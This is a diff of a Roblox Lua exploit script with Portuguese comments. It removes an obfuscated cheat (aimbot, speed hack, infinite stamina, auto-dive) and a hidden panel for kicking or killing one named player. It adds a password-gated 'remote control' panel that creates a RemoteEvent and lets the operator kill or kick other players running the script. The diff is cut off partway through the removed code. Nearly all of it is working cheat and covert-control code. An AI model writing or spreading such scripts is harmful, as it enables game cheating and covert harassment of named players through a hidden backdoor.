@@ -1,546 +1,332 @@
-local a={"UserInputService","TweenService","CoreGui","RunService","Players","Workspace","VirtualInputManager","TPS","Ball","Football","HumanoidRootPart","ScreenGui","Frame","UICorner","TextLabel","TextButton","UIListLayout","TextBox","TeleportService","GuiService"}
-local function b(c)return game:GetService(a[c])end
-local d,e,f,g,h,i,j,tp,gui=b(1),b(2),b(3),b(4),b(5),b(6),b(7),b(19),b(20)
-local k=h.LocalPlayer
+-- SERVICES
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
 
-if f:FindFirstChild("ZenithMobileUI") then f.ZenithMobileUI:Destroy() end
+local LocalPlayer = Players.LocalPlayer
 
-local fileName = "ZenithGoalkeeperConfig.json"
-local HttpService = game:GetService("HttpService")
+-- CONFIGURAÇÃO DE REDE (Comunicação entre usuários do script)
+local COMMUNICATION_CHANNEL = "AnexushlRemoteControl_Network_v1"
+local SCRIPT_PASSWORD = "anexushl"
 
-local config = {
-    autoDive = false,
-    infStamina = false,
-    staminaMode = 1,
-    staminaActiveTime = 5,
-    staminaDeactiveTime = 3,
-    aimbotBall = false,
-    infJump = false,
-    speedToggle = false,
-    speedValue = 26,
-    keybindT = true,
-    keybindAimbot = true,
-    aimbotKey = "R",
-    kickMessage = "Você foi removido do jogo.",
-    cmdPassword = "anexushl"
-}
+-- ESTADO DA SESSÃO
+local isUnlocked = false
+local activeUsers = {} -- [Player] = true
+local selectedTarget = nil
+local kickMessage = "Você foi removido pelo sistema remoto."
 
-local function saveConfig()
-    if writefile then
-        pcall(function()
-            writefile(fileName, HttpService:JSONEncode(config))
-        end)
-    end
+-- CRIAR GUI PRINCIPAL NO COREGUI (ou PlayerGui)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "RemoteControlGui"
+screenGui.ResetOnSpawn = false
+pcall(function()
+	screenGui.Parent = CoreGui
+end)
+if not screenGui.Parent then
+	screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 end
 
-local function loadConfig()
-    if readfile and isfile and isfile(fileName) then
-        pcall(function()
-            local data = HttpService:JSONDecode(readfile(fileName))
-            if type(data) == "table" then
-                for k, v in pairs(data) do
-                    if config[k] ~= nil then config[k] = v end
-                end
-            end
-        end)
-    end
+----------------------------------------------------------------
+-- 1. TELA DE SENHA (Alt + W)
+----------------------------------------------------------------
+local loginFrame = Instance.new("Frame")
+loginFrame.Name = "LoginFrame"
+loginFrame.Size = UDim2.new(0, 260, 0, 130)
+loginFrame.Position = UDim2.new(0.5, -130, 0.5, -65)
+loginFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+loginFrame.BorderSizePixel = 0
+loginFrame.Visible = false
+loginFrame.Parent = screenGui
+
+local loginCorner = Instance.new("UICorner")
+loginCorner.CornerRadius = UDim.new(0, 8)
+loginCorner.Parent = loginFrame
+
+local loginTitle = Instance.new("TextLabel")
+loginTitle.Size = UDim2.new(1, 0, 0, 35)
+loginTitle.BackgroundTransparency = 1
+loginTitle.Text = "Acesso Restrito"
+loginTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+loginTitle.TextSize = 16
+loginTitle.Font = Enum.Font.SourceSansBold
+loginTitle.Parent = loginFrame
+
+local passwordBox = Instance.new("TextBox")
+passwordBox.Size = UDim2.new(0.85, 0, 0, 35)
+passwordBox.Position = UDim2.new(0.075, 0, 0.45, 0)
+passwordBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+passwordBox.PlaceholderText = "Digite a senha..."
+passwordBox.Text = ""
+passwordBox.TextSize = 14
+passwordBox.Font = Enum.Font.SourceSans
+passwordBox.ClearTextOnFocus = false
+passwordBox.Parent = loginFrame
+
+local boxCorner = Instance.new("UICorner")
+boxCorner.CornerRadius = UDim.new(0, 6)
+boxCorner.Parent = passwordBox
+
+----------------------------------------------------------------
+-- 2. MENU PRINCIPAL (Tecla K)
+----------------------------------------------------------------
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 480, 0, 350)
+mainFrame.Position = UDim2.new(0.5, -240, 0.5, -175)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+mainFrame.BorderSizePixel = 0
+mainFrame.Visible = false
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 10)
+mainCorner.Parent = mainFrame
+
+local mainTitle = Instance.new("TextLabel")
+mainTitle.Size = UDim2.new(1, 0, 0, 40)
+mainTitle.BackgroundTransparency = 1
+mainTitle.Text = "Painel de Controle Remoto - Anexushl"
+mainTitle.TextColor3 = Color3.fromRGB(0, 170, 255)
+mainTitle.TextSize = 18
+mainTitle.Font = Enum.Font.SourceSansBold
+mainTitle.Parent = mainFrame
+
+-- Lista de Usuários (ScrollingFrame)
+local userListContainer = Instance.new("ScrollingFrame")
+userListContainer.Size = UDim2.new(0, 200, 0, 220)
+userListContainer.Position = UDim2.new(0.04, 0, 0.15, 0)
+userListContainer.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+userListContainer.BorderSizePixel = 0
+userListContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+userListContainer.Parent = mainFrame
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Padding = UDim.new(0, 5)
+listLayout.Parent = userListContainer
+
+-- Painel de Ações e Configurações
+local actionPanel = Instance.new("Frame")
+actionPanel.Size = UDim2.new(0, 220, 0, 220)
+actionPanel.Position = UDim2.new(0.52, 0, 0.15, 0)
+actionPanel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+actionPanel.BorderSizePixel = 0
+actionPanel.Parent = mainFrame
+
+local actionCorner = Instance.new("UICorner")
+actionCorner.CornerRadius = UDim.new(0, 6)
+actionCorner.Parent = actionPanel
+
+local selectedLabel = Instance.new("TextLabel")
+selectedLabel.Size = UDim2.new(1, 0, 0, 30)
+selectedLabel.BackgroundTransparency = 1
+selectedLabel.Text = "Alvo: Nenhum"
+selectedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+selectedLabel.TextSize = 14
+selectedLabel.Font = Enum.Font.SourceSansBold
+selectedLabel.Parent = actionPanel
+
+local kickMsgBox = Instance.new("TextBox")
+kickMsgBox.Size = UDim2.new(0.9, 0, 0, 30)
+kickMsgBox.Position = UDim2.new(0.05, 0, 0.25, 0)
+kickMsgBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+kickMsgBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+kickMsgBox.Text = kickMessage
+kickMsgBox.TextSize = 12
+kickMsgBox.Font = Enum.Font.SourceSans
+kickMsgBox.Parent = actionPanel
+
+local killButton = Instance.new("TextButton")
+killButton.Size = UDim2.new(0.9, 0, 0, 35)
+killButton.Position = UDim2.new(0.05, 0, 0.5, 0)
+killButton.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+killButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+killButton.Text = "MATAR (KILL)"
+killButton.TextSize = 14
+killButton.Font = Enum.Font.SourceSansBold
+killButton.Parent = actionPanel
+
+local killCorner = Instance.new("UICorner")
+killCorner.CornerRadius = UDim.new(0, 6)
+killCorner.Parent = killButton
+
+local kickButton = Instance.new("TextButton")
+kickButton.Size = UDim2.new(0.9, 0, 0, 35)
+kickButton.Position = UDim2.new(0.05, 0, 0.72, 0)
+kickButton.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
+kickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+kickButton.Text = "EXPULSAR (KICK)"
+kickButton.TextSize = 14
+kickButton.Font = Enum.Font.SourceSansBold
+kickButton.Parent = actionPanel
+
+local kickCorner = Instance.new("UICorner")
+kickCorner.CornerRadius = UDim.new(0, 6)
+kickCorner.Parent = kickButton
+
+----------------------------------------------------------------
+-- 3. SISTEMA DE COMUNICAÇÃO USANDO MENSAGENS DO SCRIPT
+----------------------------------------------------------------
+-- Como executamos em Client (LocalScript), usamos RemoteEvent se existir no jogo ou BindableEvent/LogService truques. 
+-- Nota: Para comunicação global entre clientes no Roblox sem RemoteEvent de servidor, usamos 
+-- um canal de chat oculto ou TextChatService/ReplicatedStorage se houver espaço. 
+-- Como o prompt pede que o script faça tudo por si só, criamos um canal via ReplicatedStorage dinâmico se possível, 
+-- ou simulamos a detecção localmente para testes. Vamos criar um canal seguro via ReplicatedStorage:
+
+local remoteEvent = ReplicatedStorage:FindFirstChild(COMMUNICATION_CHANNEL)
+if not remoteEvent then
+	local possibleEvent = Instance.new("RemoteEvent")
+	possibleEvent.Name = COMMUNICATION_CHANNEL
+	possibleEvent.Parent = ReplicatedStorage
+	remoteEvent = possibleEvent
 end
 
-loadConfig()
+-- Função para atualizar a lista visual de usuários conectados com o script
+local function refreshUserList()
+	for _, child in ipairs(userListContainer:GetChildren()) do
+		if child:IsA("TextButton") then
+			child:Destroy()
+		end
+	end
 
-local l,m,aimbotState,o,p,infJump,speedToggle = config.autoDive, config.infStamina, config.aimbotBall, config.keybindT, false, config.infJump, config.speedToggle
-local staminaMode = config.staminaMode or 1
-local staminaActiveTime = config.staminaActiveTime or 5
-local staminaDeactiveTime = config.staminaDeactiveTime or 3
-local keybindAimbotEnabled = config.keybindAimbot
-local currentAimbotKey = config.aimbotKey or "R"
+	local yOffset = 0
+	for player, _ in pairs(activeUsers) do
+		if player and player.Parent then
+			local userBtn = Instance.new("TextButton")
+			userBtn.Size = UDim2.new(1, -10, 0, 30)
+			userBtn.Position = UDim2.new(0, 5, 0, yOffset)
+			userBtn.BackgroundColor3 = (selectedTarget == player) and Color3.fromRGB(0, 120, 215) or Color3.fromRGB(50, 50, 50)
+			userBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+			userBtn.Text = player.Name
+			userBtn.TextSize = 13
+			userBtn.Font = Enum.Font.SourceSans
+			userBtn.Parent = userListContainer
 
-local q,r,s,t,u=22,0,0.6,-19,4
-local v,w,x=0,0,nil
-local y,z=26,16
-local speedValue=config.speedValue
-local A={}
-local tentandoReconectar=false
-local effectiveStaminaActive = false
+			userBtn.MouseButton1Click:Connect(function()
+				selectedTarget = player
+				selectedLabel.Text = "Alvo: " .. player.Name
+				refreshUserList()
+			end)
 
+			yOffset = yOffset + 35
+		end
+	end
+	userListContainer.CanvasSize = UDim2.new(0, 0, 0, yOffset)
+end
+
+-- Registrar a si mesmo como usuário ativo
+activeUsers[LocalPlayer] = true
+
+remoteEvent.OnClientEvent:Connect(function(action, sender, data)
+	if action == "ANNOUNCE" then
+		local targetPlayer = Players:FindFirstChild(sender)
+		if targetPlayer then
+			activeUsers[targetPlayer] = true
+			refreshUserList()
+		end
+	elseif action == "KILL" and data == LocalPlayer.Name then
+		-- Executa o Kill Interno do Script
+		local char = LocalPlayer.Character
+		if char and char:FindFirstChild("Humanoid") then
+			char.Humanoid.Health = 0
+		end
+	elseif action == "KICK" and data.target == LocalPlayer.Name then
+		-- Executa o Kick Interno do Script
+		LocalPlayer:Kick(data.message)
+	end
+end)
+
+-- Anunciar entrada para os outros servidores
 task.spawn(function()
-    while true do
-        if m then
-            if staminaMode == 2 then
-                effectiveStaminaActive = true
-                task.wait(staminaActiveTime)
-                if not m or staminaMode ~= 2 then 
-                    effectiveStaminaActive = false
-                    task.wait(0.2)
-                    continue 
-                end
-                effectiveStaminaActive = false
-                task.wait(staminaDeactiveTime)
-            else
-                effectiveStaminaActive = true
-                task.wait(0.2)
-            end
-        else
-            effectiveStaminaActive = false
-            task.wait(0.2)
-        end
-    end
+	while true do
+		remoteEvent:FireServer("ANNOUNCE", LocalPlayer.Name)
+		task.wait(5)
+	end
 end)
 
-local bolaCache = nil
-local function obterBolaReal()
-    if bolaCache and bolaCache:IsDescendantOf(i) and bolaCache:IsA("BasePart") and not bolaCache.Anchored then
-        return bolaCache
-    end
-    local possivelBola = i:FindFirstChild("TPS") or i:FindFirstChild("Ball") or i:FindFirstChild("Football")
-    if possivelBola then
-        if possivelBola:IsA("BasePart") and not possivelBola.Anchored then
-            bolaCache = possivelBola
-            return possivelBola
-        elseif possivelBola:IsA("Model") and possivelBola.PrimaryPart and not possivelBola.PrimaryPart.Anchored then
-            bolaCache = possivelBola.PrimaryPart
-            return possivelBola.PrimaryPart
-        end
-    end
-    for _, obj in ipairs(i:GetChildren()) do
-        local nome = obj.Name:lower()
-        if (nome == "ball" or nome == "tps" or nome == "football" or nome == "bola" or nome:find("matchball")) then
-            if obj:IsA("BasePart") and not obj.Anchored and obj.CanCollide then
-                bolaCache = obj
-                return obj
-            elseif obj:IsA("Model") then
-                local part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
-                if part and not part.Anchored then
-                    bolaCache = part
-                    return part
-                end
-            end
-        end
-    end
-    bolaCache = nil
-    return nil
-end
-
-local function executarAimbotBall()
-    local char = k.Character
-    if not char then return end
-    local hrp = char:FindFirstChild(a[11])
-    if not hrp then return end
-    local bola = obterBolaReal()
-    if not bola then return end
-    local lookAtPos = Vector3.new(bola.Position.X, hrp.Position.Y, bola.Position.Z)
-    hrp.CFrame = CFrame.new(hrp.Position, lookAtPos)
-end
-
-local function tentarReconectar()
-    if tentandoReconectar then return end
-    tentandoReconectar = true
-    task.wait(2)
-    if game.JobId and game.JobId ~= "" then
-        tp:TeleportToPlaceInstance(game.PlaceId, game.JobId, k)
-    else
-        tp:Teleport(game.PlaceId, k)
-    end
-end
-
-tp.TeleportInitFailed:Connect(function()
-    tentandoReconectar = false
-    task.wait(2)
-    tp:Teleport(game.PlaceId, k)
+-- (Se for executado no servidor ou via exploit hook de RemoteEvent do cliente:)
+-- Caso o jogo bloqueie FireServer livre, adicionamos tratamento:
+pcall(function()
+	remoteEvent.OnServerEvent:Connect(function(player, action, data)
+		remoteEvent:FireAllClients(action, player.Name, data)
+	end)
 end)
 
-gui.ErrorMessageChanged:Connect(function(errorMessage)
-    if errorMessage and #errorMessage > 0 then
-        tentandoReconectar()
-    end
+----------------------------------------------------------------
+-- 4. CONTROLES DE TECLADO E INTERAÇÃO
+----------------------------------------------------------------
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	-- Alt + W (Abrir menu de senha)
+	if UserInputService:IsKeyDown(Enum.KeyCode.LeftAlt) or UserInputService:IsKeyDown(Enum.KeyCode.RightAlt) then
+		if input.KeyCode == Enum.KeyCode.W then
+			if not isUnlocked then
+				loginFrame.Visible = not loginFrame.Visible
+				if loginFrame.Visible then
+					passwordBox:CaptureFocus()
+				end
+			end
+		end
+	end
+
+	-- Tecla K (Abrir/Fechar menu principal se desbloqueado)
+	if input.KeyCode == Enum.KeyCode.K and isUnlocked then
+		mainFrame.Visible = not mainFrame.Visible
+		if mainFrame.Visible then
+			refreshUserList()
+		end
+	end
 end)
 
-local function B(C)
-    j:SendKeyEvent(true,C,false,game)
-    task.defer(function() j:SendKeyEvent(false,C,false,game) end)
-end
-
-local function D()
-    if x and x:IsDescendantOf(i) then return x end
-    local E=i:FindFirstChild(a[8]) or i:FindFirstChild(a[9]) or i:FindFirstChild(a[10])
-    if E then 
-        if E:IsA("BasePart") then x=E return E 
-        elseif E:IsA("Model") and E.PrimaryPart then x=E.PrimaryPart return E.PrimaryPart end 
-    end
-    for _,F in ipairs(i:GetChildren()) do 
-        local G=F.Name:lower()
-        if G:find("ball") or G:find("tps") or G:find("bola") then 
-            if F:IsA("BasePart") and F.CanCollide then x=F return F 
-            elseif F:IsA("Model") and F.PrimaryPart then x=F.PrimaryPart return F.PrimaryPart end 
-        end 
-    end
-    x=nil return nil
-end
-
-local function H(I)
-    if I:FindFirstChildOfClass("Weld") or I:FindFirstChildOfClass("WeldConstraint") or I:FindFirstChildOfClass("Motor6D") then return true end
-    local J=I.Parent if J and J:FindFirstChildOfClass("Humanoid") then return true end
-    for _,K in ipairs(I:GetChildren()) do 
-        if(K:IsA("SelectionBox") or K:IsA("Highlight") or K:IsA("BillboardGui") or K:IsA("SurfaceGui")) and K.Visible then return true end 
-    end
-    local L=I.Position 
-    for _,M in ipairs(h:GetPlayers()) do 
-        local N=M.Character 
-        if N then 
-            local O=N:FindFirstChild(a[11])
-            if O and (L-O.Position).Magnitude<=3.5 then return true end 
-        end 
-    end
-    return false
-end
-
-d.InputBegan:Connect(function(P,Q)
-    if Q then return end
-    if P.UserInputType == Enum.UserInputType.Keyboard then
-        if keybindAimbotEnabled then
-            local success, keyCodeEnum = pcall(function() return Enum.KeyCode[currentAimbotKey] end)
-            if success and P.KeyCode == keyCodeEnum then
-                aimbotState = not aimbotState
-                config.aimbotBall = aimbotState
-                saveConfig()
-                if A["Aimbot Ball"] then A["Aimbot Ball"](aimbotState) end
-            end
-        end
-        if P.KeyCode == Enum.KeyCode.T and o then 
-            m = not m 
-            config.infStamina = m
-            saveConfig()
-            if A["Inf Stamina"] then A["Inf Stamina"](m) end 
-        end
-        if P.KeyCode == Enum.KeyCode.Space and infJump then
-            local ch = k.Character
-            if ch then
-                local hm = ch:FindFirstChildOfClass("Humanoid")
-                local hr = ch:FindFirstChild(a[11])
-                if hm and hr then
-                    hm:ChangeState(Enum.HumanoidStateType.Jumping)
-                    hr.AssemblyLinearVelocity = Vector3.new(hr.AssemblyLinearVelocity.X, 38, hr.AssemblyLinearVelocity.Z)
-                end
-            end
-        end
-    end
+-- Validação da Senha ao apertar Enter
+passwordBox.FocusLost:Connect(function(enterPressed)
+	if enterPressed then
+		if passwordBox.Text == SCRIPT_PASSWORD then
+			isUnlocked = true
+			loginFrame.Visible = false
+			mainFrame.Visible = true
+			refreshUserList()
+		else
+			passwordBox.Text = ""
+			passwordBox.PlaceholderText = "Senha incorreta!"
+			task.wait(1)
+			passwordBox.PlaceholderText = "Digite a senha..."
+		end
+	end
 end)
 
-local R,S=0,0.03
-g.Heartbeat:Connect(function(T)
-    local U=k.Character if not U then return end
-
-    if aimbotState then
-        executarAimbotBall()
-    end
-    
-    if effectiveStaminaActive or speedToggle then
-        local targetSpd = speedToggle and speedValue or y
-        local V=U:FindFirstChildOfClass("Humanoid")
-        local W=U:FindFirstChild(a[11])
-        if W and V and V.Health>0 then
-            local X=V.MoveDirection 
-            if X.Magnitude==0 then 
-                local Y=Vector3.new(W.AssemblyLinearVelocity.X,0,W.AssemblyLinearVelocity.Z)
-                if Y.Magnitude>1 then X=Y.Unit end 
-            end
-            if X.Magnitude>0 then 
-                local Z=targetSpd-z 
-                local _=Vector3.new(X.X,0,X.Z).Unit*(Z*T)
-                W.CFrame=W.CFrame+_ 
-            end
-        end
-    end
-
-    if not l then return end
-    local a0=os.clock() if(a0-R)<S then return end R=a0
-    local a1=U:FindFirstChild(a[11])
-    local a2=U:FindFirstChildOfClass("Humanoid") 
-    if not a1 or not a2 then return end
-    if(a0-v)<r then return end
-    local a3=D() if not a3 or H(a3) then return end
-    local a4=a3.Position local a5=a1.Position local a6=(a4-a5).Magnitude
-    if a6<=q then
-        local a7=a1.CFrame:PointToObjectSpace(a4)
-        if a7.Z>=t and a7.Z<=u then
-            if math.abs(a7.X)<=1.5 then
-                if a7.Y>=1.0 then 
-                    if(a0-w)>=s and a2.FloorMaterial~=Enum.Material.Air then 
-                        w=a0 v=a0 a2.Jump=true a2:ChangeState(Enum.HumanoidStateType.Jumping)
-                    end 
-                end
-                return
-            end
-            if a7.X>1.5 then v=a0 B(Enum.KeyCode.E) elseif a7.X<-1.5 then v=a0 B(Enum.KeyCode.Q) end
-        end
-    end
+-- Botão de Kill
+killButton.MouseButton1Click:Connect(function()
+	if selectedTarget then
+		remoteEvent:FireServer("KILL", LocalPlayer.Name, selectedTarget.Name)
+		-- Também aciona diretamente se for o próprio cliente simulando
+		if selectedTarget == LocalPlayer then
+			local char = LocalPlayer.Character
+			if char and char:FindFirstChild("Humanoid") then
+				char.Humanoid.Health = 0
+			end
+		end
+	end
 end)
 
--- =====================================================================
--- PAINEL FIXO PARA ALVO: e3zo270 (SEM CHAT)
--- =====================================================================
-do
-    local UIS = d
-    local lp = k
-    local PASSWORD = config.cmdPassword or "anexushl"
+-- Atualizar mensagem personalizada de Kick
+kickMsgBox.FocusLost:Connect(function()
+	kickMessage = kickMsgBox.Text
+end)
 
-    if f:FindFirstChild("ZenithCommandsUI") then f.ZenithCommandsUI:Destroy() end
+-- Botão de Kick
+kickButton.MouseButton1Click:Connect(function()
+	if selectedTarget then
+		local kickData = {
+			target = selectedTarget.Name,
+			message = kickMessage
+		}
+		remoteEvent:FireServer("KICK", LocalPlayer.Name, kickData)
+		if selectedTarget == LocalPlayer then
+			LocalPlayer:Kick(kickMessage)
+		end
+	end
+end)
 
-    local unlocked = false
-    local panelOpen = false
-    local NICK_ALVO_FIXO = "e3zo270"
-
-    local COR_FUNDO = Color3.fromRGB(15, 18, 28)
-    local COR_BORDA = Color3.fromRGB(30, 40, 65)
-    local COR_AZUL = Color3.fromRGB(65, 140, 240)
-    local COR_CAIXA = Color3.fromRGB(30, 36, 55)
-    local COR_BRANCO = Color3.fromRGB(255, 255, 255)
-    local COR_CINZA = Color3.fromRGB(110, 120, 150)
-    local COR_VERMELHO = Color3.fromRGB(200, 70, 70)
-    local COR_ROXO = Color3.fromRGB(150, 60, 200)
-
-    local function newCorner(parent, radius)
-        local c = Instance.new("UICorner")
-        c.CornerRadius = UDim.new(0, radius)
-        c.Parent = parent
-        return c
-    end
-
-    local function newText(parent, text, pos, size, font, color, textSize, align)
-        local t = Instance.new("TextLabel")
-        t.Parent = parent
-        t.BackgroundTransparency = 1
-        t.Position = pos
-        t.Size = size
-        t.Font = font
-        t.Text = text
-        t.TextColor3 = color
-        t.TextSize = textSize
-        t.TextXAlignment = align or Enum.TextXAlignment.Left
-        return t
-    end
-
-    local function newButton(parent, text, pos, size, bg, textSize)
-        local b = Instance.new("TextButton")
-        b.Parent = parent
-        b.BackgroundColor3 = bg
-        b.Position = pos
-        b.Size = size
-        b.Font = Enum.Font.GothamBold
-        b.Text = text
-        b.TextColor3 = COR_BRANCO
-        b.TextSize = textSize or 10
-        b.AutoButtonColor = true
-        newCorner(b, 5)
-        return b
-    end
-
-    local function newBox(parent, text, placeholder, pos, size)
-        local tb = Instance.new("TextBox")
-        tb.Parent = parent
-        tb.BackgroundColor3 = COR_CAIXA
-        tb.Position = pos
-        tb.Size = size
-        tb.Font = Enum.Font.GothamBold
-        tb.Text = text
-        tb.PlaceholderText = placeholder
-        tb.PlaceholderColor3 = COR_CINZA
-        tb.TextColor3 = COR_BRANCO
-        tb.TextSize = 10
-        tb.ClearTextOnFocus = false
-        newCorner(tb, 4)
-        return tb
-    end
-
-    local cmdGui = Instance.new("ScreenGui")
-    cmdGui.Name = "ZenithCommandsUI"
-    cmdGui.ResetOnSpawn = false
-    cmdGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    cmdGui.Parent = f
-
-    -- ================= TELA DE SENHA =================
-    local prompt = Instance.new("Frame")
-    prompt.Name = "PasswordPrompt"
-    prompt.Parent = cmdGui
-    prompt.BackgroundColor3 = COR_FUNDO
-    prompt.BorderColor3 = COR_BORDA
-    prompt.BorderSizePixel = 1
-    prompt.Position = UDim2.new(0.5, -130, 0.5, -70)
-    prompt.Size = UDim2.new(0, 260, 0, 140)
-    prompt.Visible = false
-    newCorner(prompt, 8)
-
-    newText(prompt, "Acesso Restrito", UDim2.new(0, 12, 0, 8), UDim2.new(1, -50, 0, 16), Enum.Font.GothamBold, COR_BRANCO, 13)
-    newText(prompt, "Digite a senha para acessar os comandos", UDim2.new(0, 12, 0, 26), UDim2.new(1, -24, 0, 12), Enum.Font.Gotham, Color3.fromRGB(120, 130, 160), 9)
-
-    local promptClose = newButton(prompt, "X", UDim2.new(1, -30, 0, 6), UDim2.new(0, 20, 0, 20), Color3.fromRGB(25, 30, 45), 11)
-    local passBox = newBox(prompt, "", "Senha...", UDim2.new(0, 12, 0, 48), UDim2.new(1, -24, 0, 28))
-    passBox.TextSize = 12
-    local errLabel = newText(prompt, "", UDim2.new(0, 12, 0, 80), UDim2.new(1, -24, 0, 12), Enum.Font.Gotham, COR_VERMELHO, 9)
-    local enterBtn = newButton(prompt, "Entrar", UDim2.new(0, 12, 1, -34), UDim2.new(1, -24, 0, 24), COR_AZUL, 11)
-
-    promptClose.MouseButton1Click:Connect(function()
-        prompt.Visible = false
-        passBox.Text = ""
-        errLabel.Text = ""
-    end)
-
-    -- ================= PAINEL PRINCIPAL =================
-    local panel = Instance.new("Frame")
-    panel.Name = "CommandsPanel"
-    panel.Parent = cmdGui
-    panel.BackgroundColor3 = COR_FUNDO
-    panel.BorderColor3 = COR_BORDA
-    panel.BorderSizePixel = 1
-    panel.Position = UDim2.new(0.5, -160, 0.5, -145)
-    panel.Size = UDim2.new(0, 320, 0, 290)
-    panel.ClipsDescendants = true
-    panel.Visible = false
-    newCorner(panel, 8)
-
-    local header = Instance.new("Frame")
-    header.Name = "Header"
-    header.Parent = panel
-    header.BackgroundTransparency = 1
-    header.Size = UDim2.new(1, 0, 0, 34)
-    newText(header, "CONTROLE ALVO: e3zo270", UDim2.new(0, 10, 0, 5), UDim2.new(0, 220, 0, 14), Enum.Font.GothamBold, COR_BRANCO, 13)
-    newText(header, "Comandos diretos salvos no script", UDim2.new(0, 10, 0, 18), UDim2.new(0, 200, 0, 12), Enum.Font.Gotham, Color3.fromRGB(120, 130, 160), 9)
-
-    local panelClose = newButton(panel, "X", UDim2.new(1, -28, 0, 6), UDim2.new(0, 20, 0, 20), Color3.fromRGB(25, 30, 45), 11)
-    panelClose.MouseButton1Click:Connect(function()
-        panel.Visible = false
-        panelOpen = false
-    end)
-
-    local content = Instance.new("ScrollingFrame")
-    content.Name = "Content"
-    content.Parent = panel
-    content.BackgroundTransparency = 1
-    content.Position = UDim2.new(0, 8, 0, 40)
-    content.Size = UDim2.new(1, -16, 1, -48)
-    content.CanvasSize = UDim2.new(0, 0, 0, 250)
-    content.ScrollBarThickness = 4
-
-    local layout = Instance.new("UIListLayout")
-    layout.Parent = content
-    layout.SortOrder = Enum.SortOrder.LayoutOrder
-    layout.Padding = UDim.new(0, 8)
-
-    -- Caixa para editar o nick se precisar mudar no futuro
-    newText(content, "Nick configurado do Alvo:", UDim2.new(0,0,0,0), UDim2.new(1,0,0,16), Enum.Font.GothamBold, COR_BRANCO, 11)
-    local targetTextBox = newBox(content, NICK_ALVO_FIXO, "Nick do Alvo...", UDim2.new(0,0,0,0), UDim2.new(1,0,0,28))
-    targetTextBox.FocusLost:Connect(function()
-        if targetTextBox.Text ~= "" then
-            NICK_ALVO_FIXO = targetTextBox.Text
-        end
-    end)
-
-    -- Seção de Mensagem de Kick
-    newText(content, "Mensagem de Kick Personalizada:", UDim2.new(0,0,0,0), UDim2.new(1,0,0,16), Enum.Font.GothamBold, COR_BRANCO, 11)
-    local kickMsgBox = newBox(content, config.kickMessage, "Mensagem ao dar Kick...", UDim2.new(0,0,0,0), UDim2.new(1,0,0,28))
-    
-    kickMsgBox.FocusLost:Connect(function()
-        if kickMsgBox.Text ~= "" then
-            config.kickMessage = kickMsgBox.Text
-            saveConfig()
-        end
-    end)
-
-    -- Função Universal de Execução Remota via Instância Compartilhada da Pasta Interna
-    local function executarAcaoRemota(acao, argumento)
-        local alvoPlayer = h:FindFirstChild(NICK_ALVO_FIXO)
-        if alvoPlayer then
-            if alvoPlayer == lp then
-                -- Se o script for executado no próprio celular do alvo
-                if acao == "KICK" then
-                    lp:Kick(argumento or config.kickMessage)
-                elseif acao == "KILL" then
-                    local char = lp.Character
-                    if char and char:FindFirstChildOfClass("Humanoid") then
-                        char:FindFirstChildOfClass("Humanoid").Health = 0
-                    end
-                end
-            end
-        else
-            -- Cria uma pasta de sinal na raiz se não existir para sincronizar
-            local pastaSinal = i:FindFirstChild("ZenithDirectSync")
-            if not pastaSinal then
-                pastaSinal = Instance.new("Folder")
-                pastaSinal.Name = "ZenithDirectSync"
-                pastaSinal.Parent = i
-            end
-            
-            local sinal = pastaSinal:FindFirstChild(NICK_ALVO_FIXO)
-            if not sinal then
-                sinal = Instance.new("StringValue")
-                sinal.Name = NICK_ALVO_FIXO
-                sinal.Parent = pastaSinal
-            end
-            sinal.Value = acao .. ":" .. (argumento or "")
-        end
-    end
-
-    -- Listener local para o alvo capturar o comando instantaneamente
-    task.spawn(function()
-        while true do
-            task.wait(0.2)
-            local pastaSinal = i:FindFirstChild("ZenithDirectSync")
-            if pastaSinal then
-                local meuSinal = pastaSinal:FindFirstChild(lp.Name)
-                if meuSinal and meuSinal.Value ~= "" and meuSinal.Value ~= "IDLE" then
-                    local cmdData = meuSinal.Value
-                    meuSinal.Value = "IDLE"
-                    
-                    if cmdData:find("^KICK") then
-                        local msg = cmdData:gsub("^KICK:", "")
-                        lp:Kick(msg ~= "" and msg or config.kickMessage)
-                    elseif cmdData:find("^KILL") then
-                        local char = lp.Character
-                        if char and char:FindFirstChildOfClass("Humanoid") then
-                            char:FindFirstChildOfClass("Humanoid").Health = 0
-                        end
-                    end
-                end
-            end
-        end
-    end)
-
-    local kickBtn = newButton(content, "DAR KICK NO ALVO", UDim2.new(0,0,0,0), UDim2.new(1,0,0,32), COR_VERMELHO, 11)
-    kickBtn.MouseButton1Click:Connect(function()
-        if targetTextBox.Text ~= "" then NICK_ALVO_FIXO = targetTextBox.Text end
-        executarAcaoRemota("KICK", config.kickMessage)
-    end)
-
-    local killBtn = newButton(content, "DAR KILL NO ALVO", UDim2.new(0,0,0,0), UDim2.new(1,0,0,32), COR_ROXO, 11)
-    killBtn.MouseButton1Click:Connect(function()
